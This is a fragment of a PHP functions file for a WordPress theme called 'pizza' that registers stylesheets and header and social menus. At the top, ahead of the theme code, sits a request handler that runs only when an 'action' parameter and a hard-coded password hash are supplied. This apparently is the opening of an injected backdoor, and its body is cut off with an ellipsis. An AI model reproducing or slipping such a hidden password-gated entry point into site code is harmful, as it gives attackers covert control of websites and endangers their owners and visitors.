<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'edc2b3f793560cc70342ded0328f2459'))
	{
...
add_action('wp_enqueue_scripts','pizza_styles');

	//Add Menus
	function pizza_menus(){
		register_nav_menus( array(
			'header-menu'	=> __( 'Header Menu', 'pizza'),
			'social-menu'	=> __( 'Social Menu', 'pizza')
		) );
	}
